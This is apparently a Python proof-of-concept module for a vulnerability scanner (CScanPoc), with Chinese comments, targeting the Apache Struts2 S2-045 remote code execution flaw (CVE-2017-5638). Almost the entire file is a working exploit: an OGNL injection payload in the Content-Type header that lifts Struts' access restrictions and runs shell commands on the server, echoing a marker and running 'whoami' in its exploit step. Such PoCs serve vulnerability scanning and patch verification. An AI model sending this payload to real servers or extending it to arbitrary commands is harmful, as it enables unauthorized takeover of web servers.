# coding: utf-8

import http.client
import urllib.request
import urllib.error
import urllib.parse
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0016'  # 平台漏洞编号，留空
    name = 'Apache Struts2存在S2-045远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-03-07'  # 漏洞公布时间
    desc = '''
        Apache Struts是一款用于创建企业级Java Web应用的开源框架。 

        Apache Struts2存在S2-045远程代码执行漏洞。远程攻击者利用该漏洞可直接取得网站服务器控制权。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474'  # 漏洞来源
    cnvd_id = 'CNVD-2017-02474'  # cnvd漏洞编号
    cve_id = 'CVE-2017-5638'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Apache struts >=2.3.5，<=2.3.31,Apache struts >=2.5，<=2.5.10'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2329e024-a5c8-4a74-bc81-76889c399bc3'
    author = 'cscan'  # POC编写者
    create_date = '2018-03-24'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            payload = '''%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 92933839f1efb2da9a4799753ee8d79c').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''

            try:
                self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
                headers = {'User-Agent': 'Mozilla/5.0',
                           'Content-Type': payload}
                request = urllib.request.Request(self.target, headers=headers)
                r = str(urllib.request.urlopen(request).read())
            except http.client.IncompleteRead as e:
                r = e.partial

            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 这里的poc利用，我只做了whoami的查询，后期可添加参数，将会可以定制化用户自己提供参数
            payload = '''%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 92933839f1efb2da9a4799753ee8d79c `whoami`').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''

            try:
                self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
                headers = {'User-Agent': 'Mozilla/5.0',
                           'Content-Type': payload}
                request = urllib.request.Request(self.target, headers=headers)
                r = str(urllib.request.urlopen(request).read())
            except http.client.IncompleteRead as e:
                r = e.partial
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                whoami = r.split(' ')[1]
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，网站当前用户为{whoami}'.format(
                    target=self.target, name=self.vuln.name, whoami=whoami))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
